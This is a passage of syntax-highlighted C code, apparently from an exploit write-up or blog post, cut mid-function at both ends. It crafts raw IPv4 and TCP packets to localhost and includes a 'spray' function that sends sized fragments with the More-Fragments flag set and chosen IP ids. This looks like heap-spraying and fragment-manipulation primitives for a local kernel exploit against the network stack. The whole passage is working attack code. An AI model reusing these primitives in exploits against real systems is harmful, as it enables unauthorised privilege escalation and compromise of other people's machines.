 <span class="comment">// bind socket descriptor sd to specified interface with setsockopt() since</span></span><br><span class="line">    <span class="comment">// none of the other arguments of sendto() specify which interface to use.</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;ifr, <span class="number">0</span>, <span class="keyword">sizeof</span>(ifr));</span><br><span class="line">    <span class="built_in">snprintf</span>(ifr.ifr_name, <span class="keyword">sizeof</span>(ifr.ifr_name), <span class="string">"%s"</span>, interface);</span><br><span class="line">    <span class="keyword">if</span> (ioctl(sd, SIOCGIFINDEX, &amp;ifr) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"ioctl() failed to find interface "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    close(sd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Source IPv4 address: you need to fill this out</span></span><br><span class="line">    <span class="built_in">strcpy</span>(src_ip, <span class="string">"127.0.0.1"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(dst_ip, <span class="string">"127.0.0.1"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IPv4 header</span></span><br><span class="line">    <span class="comment">// IPv4 header length (4 bits): Number of 32-bit words in header = 5</span></span><br><span class="line">    iphdr.ip_hl = IP4_HDRLEN / <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">    <span class="comment">// Internet Protocol version (4 bits): IPv4</span></span><br><span class="line">    iphdr.ip_v = <span class="number">4</span>;</span><br><span class="line">    <span class="comment">// Type of service (8 bits)</span></span><br><span class="line">    iphdr.ip_tos = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Total length of datagram (16 bits): IP header + TCP header + TCP data</span></span><br><span class="line">    iphdr.ip_len = htons(IP4_HDRLEN + payloadlen);</span><br><span class="line">    <span class="comment">// ID sequence number (16 bits): unused, since single datagram</span></span><br><span class="line">    iphdr.ip_id = htons(pkt_info-&gt;ip_id);</span><br><span class="line">    <span class="comment">// Flags, and Fragmentation offset (3, 13 bits): 0 since single datagram</span></span><br><span class="line">    <span class="comment">// Zero (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Do not fragment flag (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// More fragments following flag (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">2</span>] = pkt_info-&gt;MF;</span><br><span class="line">    <span class="comment">// Fragmentation offset (13 bits)</span></span><br><span class="line">    ip_flags[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    iphdr.ip_off =</span><br><span class="line">        htons((ip_flags[<span class="number">0</span>] &lt;&lt; <span class="number">15</span>) + (ip_flags[<span class="number">1</span>] &lt;&lt; <span class="number">14</span>) + (ip_flags[<span class="number">2</span>] &lt;&lt; <span class="number">13</span>) +</span><br><span class="line">              ip_flags[<span class="number">3</span>] + (pkt_info-&gt;ip_off &gt;&gt; <span class="number">3</span>));</span><br><span class="line">    <span class="comment">// Time-to-Live (8 bits): default to maximum value</span></span><br><span class="line">    iphdr.ip_ttl = <span class="number">255</span>;</span><br><span class="line">    <span class="comment">// Transport layer protocol (8 bits): 6 for TCP</span></span><br><span class="line">    iphdr.ip_p = pkt_info-&gt;ip_p;</span><br><span class="line">    <span class="comment">// iphdr.ip_p = IPPROTO_TCP;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Source IPv4 address (32 bits)</span></span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, src_ip, &amp;(iphdr.ip_src))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"inet_pton() failed.\nError message: %s"</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Destination IPv4 address (32 bits)</span></span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, dst_ip, &amp;(iphdr.ip_dst))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"inet_pton() failed.\nError message: %s"</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IPv4 header checksum (16 bits): set to 0 when calculating checksum</span></span><br><span class="line">    iphdr.ip_sum = <span class="number">0</span>;</span><br><span class="line">    iphdr.ip_sum = checksum((<span class="keyword">uint16_t</span> *)&amp;iphdr, IP4_HDRLEN);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare packet.</span></span><br><span class="line">    <span class="comment">// First part is an IPv4 header.</span></span><br><span class="line">    <span class="built_in">memcpy</span>(packet, &amp;iphdr, IP4_HDRLEN * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line">    <span class="comment">// Last part is upper layer protocol data.</span></span><br><span class="line">    <span class="built_in">memcpy</span>((packet + IP4_HDRLEN), payload, payloadlen * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The kernel is going to prepare layer 2 information (ethernet frame</span></span><br><span class="line">    <span class="comment">// header) for us. For that, we need to specify a destination for the kernel</span></span><br><span class="line">    <span class="comment">// in order for it to decide where to send the raw datagram. We fill in a</span></span><br><span class="line">    <span class="comment">// struct in_addr with the desired destination IP address, and pass this</span></span><br><span class="line">    <span class="comment">// structure to the sendto() function.</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;<span class="built_in">sin</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">    <span class="built_in">sin</span>.sin_addr.s_addr = iphdr.ip_dst.s_addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Submit request for a raw socket descriptor.</span></span><br><span class="line">    <span class="keyword">if</span> ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"socket() failed "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set flag so socket expects us to provide IPv4 header.</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &amp;on, <span class="keyword">sizeof</span>(on)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"setsockopt() failed to set IP_HDRINCL "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bind socket to interface index.</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sd, SOL_SOCKET, SO_BINDTODEVICE, &amp;ifr, <span class="keyword">sizeof</span>(ifr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"setsockopt() failed to bind to interface "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send packet.</span></span><br><span class="line">    <span class="keyword">if</span> (sendto(sd, packet, IP4_HDRLEN + TCP_HDRLEN + payloadlen, <span class="number">0</span>,</span><br><span class="line">               (struct sockaddr *)&amp;<span class="built_in">sin</span>, <span class="keyword">sizeof</span>(struct sockaddr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"sendto() failed "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Close socket descriptor.</span></span><br><span class="line">    close(sd);</span><br><span class="line">    <span class="comment">// Free allocated memory.</span></span><br><span class="line">    <span class="built_in">free</span>(packet);</span><br><span class="line">    <span class="built_in">free</span>(interface);</span><br><span class="line">    <span class="built_in">free</span>(src_ip);</span><br><span class="line">    <span class="built_in">free</span>(dst_ip);</span><br><span class="line">    <span class="built_in">free</span>(ip_flags);</span><br><span class="line">    <span class="built_in">free</span>(tcp_flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spray</span><span class="params">(<span class="keyword">int</span> size, <span class="keyword">uint16_t</span> ip_id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, status, sd, *ip_flags, *tcp_flags;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> on = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">char</span> *interface, *src_ip, *dst_ip;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> <span class="title">iphdr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> <span class="title">tcphdr</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *payload;</span><br><span class="line">    <span class="keyword">int</span> payloadlen;</span><br><span class="line">    <span class="keyword">uint8_t</span> *packet;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ifreq</span> <span class="title">ifr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate memory for various arrays.</span></span><br><span class="line">    packet = allocate_ustrmem(IP_MAXPACKET);</span><br><span class="line">    interface = allocate_strmem(<span class="number">40</span>);</span><br><span class="line">    src_ip = allocate_strmem(INET_ADDRSTRLEN);</span><br><span class="line">    dst_ip = allocate_strmem(INET_ADDRSTRLEN);</span><br><span class="line">    ip_flags = allocate_intmem(<span class="number">4</span>);</span><br><span class="line">    tcp_flags = allocate_intmem(<span class="number">8</span>);</span><br><span class="line">    payload = allocate_strmem(IP_MAXPACKET);</span><br><span class="line"></span><br><span class="line">    payloadlen = size - <span class="number">84</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Interface to send packet through.</span></span><br><span class="line">    <span class="built_in">strcpy</span>(interface, g_interface);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Submit request for a socket descriptor to look up interface.</span></span><br><span class="line">    <span class="keyword">if</span> ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"socket() failed to get socket descriptor for using ioctl() "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use ioctl() to look up interface index which we will use to</span></span><br><span class="line">    <span class="comment">// bind socket descriptor sd to specified interface with setsockopt() since</span></span><br><span class="line">    <span class="comment">// none of the other arguments of sendto() specify which interface to use.</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;ifr, <span class="number">0</span>, <span class="keyword">sizeof</span>(ifr));</span><br><span class="line">    <span class="built_in">snprintf</span>(ifr.ifr_name, <span class="keyword">sizeof</span>(ifr.ifr_name), <span class="string">"%s"</span>, interface);</span><br><span class="line">    <span class="keyword">if</span> (ioctl(sd, SIOCGIFINDEX, &amp;ifr) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"ioctl() failed to find interface "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    close(sd);</span><br><span class="line">    <span class="comment">// dbg_printf("Index for interface %s is %i\n", interface, ifr.ifr_ifindex);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Source IPv4 address: you need to fill this out</span></span><br><span class="line">    <span class="built_in">strcpy</span>(src_ip, <span class="string">"127.0.0.1"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(dst_ip, <span class="string">"127.0.0.1"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IPv4 header</span></span><br><span class="line">    <span class="comment">// IPv4 header length (4 bits): Number of 32-bit words in header = 5</span></span><br><span class="line">    iphdr.ip_hl = IP4_HDRLEN / <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">    <span class="comment">// Internet Protocol version (4 bits): IPv4</span></span><br><span class="line">    iphdr.ip_v = <span class="number">4</span>;</span><br><span class="line">    <span class="comment">// Type of service (8 bits)</span></span><br><span class="line">    iphdr.ip_tos = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Total length of datagram (16 bits): IP header + TCP header + TCP data</span></span><br><span class="line">    iphdr.ip_len = htons(IP4_HDRLEN + TCP_HDRLEN + payloadlen);</span><br><span class="line">    <span class="comment">// ID sequence number (16 bits): unused, since single datagram</span></span><br><span class="line">    iphdr.ip_id = htons(ip_id);</span><br><span class="line">    <span class="comment">// Flags, and Fragmentation offset (3, 13 bits): 0 since single datagram</span></span><br><span class="line">    <span class="comment">// Zero (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Do not fragment flag (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// More fragments following flag (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// Fragmentation offset (13 bits)</span></span><br><span class="line">    ip_flags[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    iphdr.ip_off = htons((ip_flags[<span class="number">0</span>] &lt;&lt; <span class="number">15</span>) + (ip_flags[<span class="number">1</span>] &lt;&lt; <span class="number">14</span>) +</span><br><span class="line">                         (ip_flags[<span class="number">2</span>] &lt;&lt; <span class="number">13</span>) + ip_flags[<span class="number">3</span>]);</span><br><span class="line">    <span class="comment">// Time-to-Live (8 bits): default to maximum value</span></span><br><span class="line">    iphdr.ip_ttl = <span class="number">255</span>;</span><br><span class="line">    <span class="comment">// Transport layer protocol (8 bits): 6 for TCP</span></span><br><span class="line">    iphdr.ip_p = IPPROTO_TCP;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Source IPv4 address (32 bits)</span></span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, src_ip, &amp;(iphdr.ip_src))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"inet_pton() failed.\nError message: %s"</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Destination IPv4 address (32 bits)</span></span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, dst_ip, &amp;(iphdr.ip_dst))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"inet_pton() failed.\nError message: %s"</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IPv4 header checksum (16 bits): set to 0 when calculating checksum</span></span><br><span class="line">    iphdr.ip_sum = <span class="number">0</span>;</span><br><span class="line">    iphdr.ip_sum = checksum((<span class="keyword">uint16_t</span> *)&amp;iphdr, IP4_HDRLEN);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TCP header</span></span><br><span class="line">    <span class="comment">// Source port number (16 bits)</span></span><br><span class="line">    tcphdr.th_sport = htons(<span class="number">60</span>);</span><br><span class="line">    <span class="comment">// Destination port number (16 bits)</span></span><br><span class="line">    tcphdr.th_dport = htons(<span class="number">80</span>);</span><br><span class="line">    <span class="comment">// Sequence number (32 bits)</span></span><br><span class="line">    tcphdr.th_seq = htonl(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Acknowledgement number (32 bits)</span></span><br><span class="line">    tcphdr.th_ack = htonl(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Reserved (4 bits): should be 0</span></span><br><span class="line">    tcphdr.th_x2 = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Data offset (4 bits): size of TCP header in 32-bit words</span></span><br><span class="line">    tcphdr.th_off = TCP_HDRLEN / <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Flags (8 bits)</span></span><br><span class="line">    <span class="comment">// FIN flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// SYN flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// RST flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// PSH flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">3</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// ACK flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">4</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// URG flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// ECE flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// CWR flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">    tcphdr.th_flags = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        tcphdr.th_flags += (tcp_flags[i] &lt;&lt; i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Window size (16 bits)</span></span><br><span class="line">    tcphdr.th_win = htons(<span class="number">65535</span>);</span><br><span class="line">    <span class="comment">// Urgent pointer (16 bits): 0 (only valid if URG flag is set)</span></span><br><span class="line">    tcphdr.th_urp = htons(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// TCP checksum (16 bits)</span></span><br><span class="line">    tcphdr.th_sum =</span><br><span class="line">        tcp4_checksum(iphdr, tcphdr, (<span class="keyword">uint8_t</span> *)payload, payloadlen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare packet.</span></span><br><span class="line">    <span class="comment">// First part is an IPv4 header.</span></span><br><span class="line">    <span class="built_in">memcpy</span>(packet, &amp;iphdr, IP4_HDRLEN * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line">    <span class="comment">// Next part of packet is upper layer protocol header.</span></span><br><span class="line">    <span class="built_in">memcpy</span>((packet + IP4_HDRLEN), &amp;tcphdr, TCP_HDRLEN * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line">    <span class="comment">// Last part is upper layer protocol data.</span></span><br><span class="line">    <span class="built_in">memcpy</span>((packet + IP4_HDRLEN + TCP_HDRLEN), payload,</span><br><span class="line">           payloadlen * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The kernel is going to prepare layer 2 information (ethernet frame</span></span><br><span class="line">    <span class="comment">// header) for us. For that, we need to specify a destination for the kernel</span></span><br><span class="line">    <span class="comment">// in order for it to decide where to send the raw datagram. We fill in a</span></span><br><span class="line">    <span class="comment">// struct in_addr with the desired destination IP address, and pass this</span></span><br><span class="line">    <span class="comment">// structure to the sendto() function.</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;<span class="built_in">sin</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">    <span class="built_in">sin</span>.sin_addr.s_addr = iphdr.ip_dst.s_addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Submit request for a raw socket descriptor.</span></span><br><span class="line">    <span class="keyword">if</span> ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"socket() failed "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set flag so socket expects us to provide IPv4 header.</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &amp;on, <span class="keyword">sizeof</span>(on)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"setsockopt() failed to set IP_HDRINCL "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bind socket to interface index.</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sd, SOL_SOCKET, SO_BINDTODEVICE, &amp;ifr, <span class="keyword">sizeof</span>(ifr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"setsockopt() failed to bind to interface "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send packet.</span></span><br><span class="line">    <span class="keyword">if</span> (sendto(sd, packet, IP4_HDRLEN + TCP_HDRLEN + payloadlen, <span class="number">0</span>,</span><br><span class="line">               (struct sockaddr *)&amp;<span class="built_in">sin</span>, <span class="keyword">sizeof</span>(struct sockaddr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"sendto() failed "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Close socket descriptor.</span></span><br><span class="line">    close(sd);</span><br><span class="line">    <span class="comment">// Free allocated memory.</span></span><br><span class="line">    <span class="built_in">free</span>(packet);</span><br><span class="line">    <span class="built_in">free</span>(interface);</span><br><span class="line">    <span class="built_in">free</span>(src_ip);</span><br><span class="line">    <span class="built_in">free</span>(dst_ip);</span><br><span class="line">    <span class="built_in">free</span>(ip_flags);</span><br><span class="line">    <span class="built_in">free</span>(tcp_flags);</span><br><span class="line">    <span class="built_in">free</span>(payload);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Computing the internet checksum (RFC 1071).</span></span><br><span class="line"><span class="comment">// Note that the internet checksum does not preclude collisions.</span></span><br><span class="line"><span class="keyword">uint16_t</span> checksum(<span class="keyword">uint16_t</span> *addr, <span class="keyword">int</span> len) &#123;</span><br><span class="line">    <span class="keyword">int</span> count = len;</span><br><span class="line">    <span class="keyword">register</span> <span class="keyword">uint32_t</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> answer = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sum up 2-byte values until none or only one byte left.</span></span><br><span class="line">    <span class="keyword">while</span> (count &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        sum += *(addr++);</span><br><span class="line">        count -= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add left-over byte, if any.</span></span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        sum += *(<span class="keyword">uint8_t</span> *)addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fold 32-bit sum into 16 bits; we lose information by doing this,</span></span><br><span class="line">    <span class="comment">// increasing the chances of a collision.</span></span><br><span class="line">    <span class="comment">// sum = (lower 16 bits) + (upper 16 bits shifted right 16 bits)</span></span><br><span class="line">    <span class="keyword">while</span> (sum &gt;&gt; <span class="number">16</span>) &#123;</span><br><span class="line">        sum = (sum &amp; <span class="number">0xffff</span>) + (sum &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Checksum is one's compliment of sum.</span></span><br><span class="line">    answer = ~sum;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (answer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Build IPv4 ICMP pseudo-header and call checksum function.</span></span><br><span class="line"><span class="keyword">uint16_t</span> icmp4_checksum(struct icmp icmphdr, <span class="keyword">uint8_t</span> *payload, <span class="keyword">int</span> payloadlen) &#123;</span><br><span class="line">    <span class="keyword">char</span> buf[IP_MAXPACKET];</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    <span class="keyword">int</span> chksumlen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    ptr = &amp;buf[<span class="number">0</span>]; <span class="comment">// ptr points to beginning of buffer buf</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Message Type to buf (8 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_type, <span class="keyword">sizeof</span>(icmphdr.icmp_type));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(icmphdr.icmp_type);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(icmphdr.icmp_type);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Message Code to buf (8 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_code, <span class="keyword">sizeof</span>(icmphdr.icmp_code));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(icmphdr.icmp_code);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(icmphdr.icmp_code);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy ICMP checksum to buf (16 bits)</span></span><br><span class="line">    <span class="comment">// Zero, since we don't know it yet</span></span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    chksumlen += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Identifier to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_id, <span class="keyword">sizeof</span>(icmphdr.icmp_id));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(icmphdr.icmp_id);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(icmphdr.icmp_id);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Sequence Number to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_seq, <span class="keyword">sizeof</span>(icmphdr.icmp_seq));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(icmphdr.icmp_seq);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(icmphdr.icmp_seq);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy payload to buf</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, payload, payloadlen);</span><br><span class="line">    ptr += payloadlen;</span><br><span class="line">    chksumlen += payloadlen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Pad to the next 16-bit boundary</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; payloadlen % <span class="number">2</span>; i++, ptr++) &#123;</span><br><span class="line">        *ptr = <span class="number">0</span>;</span><br><span class="line">        ptr++;</span><br><span class="line">        chksumlen++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> checksum((<span class="keyword">uint16_t</span> *)buf, chksumlen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Build IPv4 TCP pseudo-header and call checksum function.</span></span><br><span class="line"><span class="keyword">uint16_t</span> tcp4_checksum(struct ip iphdr, struct tcphdr tcphdr, <span class="keyword">uint8_t</span> *payload,</span><br><span class="line">                       <span class="keyword">int</span> payloadlen) &#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> svalue;</span><br><span class="line">    <span class="keyword">char</span> buf[IP_MAXPACKET], cvalue;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    <span class="keyword">int</span> i, chksumlen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ptr points to beginning of buffer buf</span></span><br><span class="line">    ptr = &amp;buf[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy source IP address into buf (32 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;iphdr.ip_src.s_addr, <span class="keyword">sizeof</span>(iphdr.ip_src.s_addr));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(iphdr.ip_src.s_addr);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(iphdr.ip_src.s_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy destination IP address into buf (32 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;iphdr.ip_dst.s_addr, <span class="keyword">sizeof</span>(iphdr.ip_dst.s_addr));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(iphdr.ip_dst.s_addr);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(iphdr.ip_dst.s_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy zero field to buf (8 